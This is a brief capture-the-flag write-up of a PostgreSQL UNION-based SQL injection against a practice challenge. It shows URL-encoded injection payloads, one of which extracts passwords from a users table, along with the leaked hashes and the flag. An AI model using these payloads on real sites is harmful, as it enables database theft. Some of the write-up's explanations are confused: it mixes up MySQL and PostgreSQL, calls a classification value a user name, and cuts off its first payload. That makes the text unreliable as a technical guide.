This challenge was related to simple  PostgreSQL. injection
The VERSION() function returns the current version of the MySQL database, as a string which let's us know it's postgresql

"https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%20%272%27,%20%27safe%27,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)"

we get the respective output from this.

invalid input syntax for type numeric: " 1 Default safe default testing icon avatar 2 Teddy euclid To please the teddy, one must offer them a sacrifice of your finest tea teddy 3 Traffic Cone #88192 neutralized We believe they appear from interdimensional rifts with no clear origin cone 4 Gnomial thaumiel If encountered in the wild do not make eye contact. They only become more aggressive. gnome 5 Ǎ̷̓d̴͗͒d̸͛͛i̷͋̃ṡ̵̍ơ̸̒ṅ̶̌ apollyon H̵̔̂Ė̵̈ ̴̛̽I̵͛͘S̷͒̇ ̷̈́̒Ȁ̷͚L̴̀̿R̴̾̌E̷͆̚Ā̶̛D̷̒̐Y̶͗͌ ̷̏̔H̶̿̚Ẽ̶̄R̷̈́͝E̸̊̈́ crump 1 glenn 9651cbc7c0b5fb1a81f2858a07813c82 Making More Challenges 2 teddy e2ec2b31abe380b989ff057aef66377a PWNing Away 3 admin gigem{SQL_1nj3ct1ons_c4n_b3_fun} Away on Vacation "

as we can see the user name is thaumiel and hence we include it in our payload
payload="Cone%27+Union+select+1,password,%27thaumiel%27,%27d%27,%27a%27+from+users--"


it allows to execute a fully formatted subquery within the injected part, which technically has almost the same impact as interacting with a pure PostgreSQL database. 


gigem{SQL_1nj3ct1ons_c4n_b3_fun}

